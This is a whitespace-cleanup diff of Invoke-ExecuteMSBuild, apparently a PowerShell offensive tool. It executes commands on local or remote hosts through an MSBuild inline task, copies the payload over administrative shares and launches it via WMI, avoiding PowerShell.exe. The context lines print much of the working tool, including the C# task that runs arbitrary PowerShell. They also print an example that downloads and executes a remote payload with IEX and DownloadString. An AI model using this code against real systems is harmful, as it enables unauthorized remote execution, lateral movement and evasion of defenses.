@@ -11,41 +11,41 @@ function Invoke-ExecuteMSBuild
 
     .DESCRIPTION
     This function executes a powershell command on a local/remote host using MSBuild and an inline task. If credentials are provided, the default administrative share is mounted locally.
-    The xml file is copied to the specified path through the share. If credentials are not provided for a remote host, the xml file is copied using the default administrative share. If the Command 
-    parameter is omitted, the embedded powershell command will be used. This command will be executed in the context of the MSBuild.exe process without starting PowerShell.exe. 
+    The xml file is copied to the specified path through the share. If credentials are not provided for a remote host, the xml file is copied using the default administrative share. If the Command
+    parameter is omitted, the embedded powershell command will be used. This command will be executed in the context of the MSBuild.exe process without starting PowerShell.exe.
 
     .PARAMETER ComputerName
-    The IP address or host name to target. If omitted, all commands will be executed on localhost. 
+    The IP address or host name to target. If omitted, all commands will be executed on localhost.
 
     .PARAMETER UserName
-    UserName to utilize for all Wmi commands on the remote host. 
+    UserName to utilize for all Wmi commands on the remote host.
 
     .PARAMETER Password
-    Password to utilize for all Wmi commands on the remote host. 
+    Password to utilize for all Wmi commands on the remote host.
 
     .PARAMETER FilePath
-    The desired location to copy the xml file on the target. 
+    The desired location to copy the xml file on the target.
 
     .PARAMETER DriveLetter
     The drive letter to use when mounting the share locally.
 
     .PARAMETER Command
-    The PowerShell command to execute on the target. 
+    The PowerShell command to execute on the target.
 
     .EXAMPLE
     Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -UserName 'Test.org\Joe' -Password 'Password123!'
 
-    Execute the embedded powershell command on the specified hostname, with the specified credentials 
+    Execute the embedded powershell command on the specified hostname, with the specified credentials
 
-    .EXAMPLE 
+    .EXAMPLE
     Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -Command "IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')"
 
     Execute the specified powershell command on testvm.test.org in the current user context
 
-    .EXAMPLE 
-    Invoke-ExecuteMSBuild 
+    .EXAMPLE
+    Invoke-ExecuteMSBuild
 
-    Execute the embedded powershell command on localhost 
+    Execute the embedded powershell command on localhost
 
     .OUTPUTS
     ManagementBaseObject
@@ -84,7 +84,7 @@ function Invoke-ExecuteMSBuild
     $WmiArgs = @{}
 
     function Invoke-ExecuteMSBuildHelper {
-        Write-Verbose "[+]Executing MSBuild with xml...." 
+        Write-Verbose "[+]Executing MSBuild with xml...."
         $WmiArgs = @{
             Namespace = 'root/CIMV2'
             Class = 'Win32_Process'
@@ -94,8 +94,8 @@ function Invoke-ExecuteMSBuild
         $cmd = "cmd.exe /c $MSBuildPath $FilePath"
 
         $WmiArgs['ArgumentList'] = $cmd
-                    
-        $result = Invoke-WmiMethod @WmiArgs @commonArgs 
+
+        $result = Invoke-WmiMethod @WmiArgs @commonArgs
         if ($result.ReturnValue -ne 0) {
             Write-Verbose "Unable to execute $cmd with error code: $($result.ReturnValue)"
         }
@@ -135,7 +135,7 @@ function Invoke-ExecuteMSBuild
     <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
-    
+
       using System;
       using System.IO;
       using System.Diagnostics;
@@ -151,7 +151,7 @@ function Invoke-ExecuteMSBuild
 
       using Microsoft.Build.Framework;
       using Microsoft.Build.Utilities;
-              
+
       public class ClassExample :  Task, ITask
       {
         public override bool Execute()
@@ -168,13 +168,13 @@ function Invoke-ExecuteMSBuild
                     pipeline.Commands.AddScript(command);
                     pipeline.Invoke();
                     runspace.Close();
-          
+
               return true;
           }
 
             }
- 
-      
+
+
         ]]>
       </Code>
     </Task>
@@ -189,9 +189,9 @@ LAUNCHER
 "@
 
 
-    #If the Username and Password are specified, add the ComputerName and PSCredential object to commonArgs for later use. 
-    if (($PSBoundParameters['ComputerName'])) { 
-        $commonArgs['ComputerName'] = $ComputerName 
+    #If the Username and Password are specified, add the ComputerName and PSCredential object to commonArgs for later use.
+    if (($PSBoundParameters['ComputerName'])) {
+        $commonArgs['ComputerName'] = $ComputerName
         if ($PSCmdlet.ParameterSetName -eq "Credentials") {
             $MountShare = $True
             $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
@@ -240,7 +240,7 @@ LAUNCHER
         break
     }
 
-    #Get the default drive of the target system. If it does not match the drive in FilePath, correct it. 
+    #Get the default drive of the target system. If it does not match the drive in FilePath, correct it.
     $WmiArgs = @{
         Namespace = 'root/CIMV2'
         Class = 'Win32_OperatingSystem'
@@ -261,8 +261,8 @@ LAUNCHER
             $InlineTask | Out-File -FilePath "$DriveLetter$($FilePath.Split(':')[1])" -Encoding ascii
         }
         catch [System.Exception] {
-            #if we can't map the new share locally, remove it and exit 
-            Write-Error $_ 
+            #if we can't map the new share locally, remove it and exit
+            Write-Error $_
             $null = $Network.RemoveNetworkDrive($DriveLetter,$True,$True)
             break
         }
@@ -275,7 +275,7 @@ LAUNCHER
         $Network.RemoveNetworkDrive($DriveLetter,$True,$True)
     }
     elseif ($commonArgs['ComputerName']) {
-        #When omitting credentials when specifying a ComputerName, it's assumed that the current user context has administrative privileges on the target. 
+        #When omitting credentials when specifying a ComputerName, it's assumed that the current user context has administrative privileges on the target.
         #Therefore we can just write the file on the target using the C$ administrative share.
         Write-Verbose "[+]UserName and Password parameters were not used. Copying the xml file using the C$ Default Share on $ComputerName"
         $RemotePath = "\\$ComputerName\$($FilePath.Replace(':','$'))"
@@ -284,7 +284,7 @@ LAUNCHER
             $InlineTask | Out-File -Encoding ascii $RemotePath
         }
         catch [System.Exception] {
-            Write-Error $_ 
+            Write-Error $_
             break
         }
 
@@ -300,7 +300,7 @@ LAUNCHER
             $InlineTask | Out-File -Encoding ascii $FilePath
         }
         catch [System.Exception] {
-            Write-Error $_ 
+            Write-Error $_
             break
         }
 
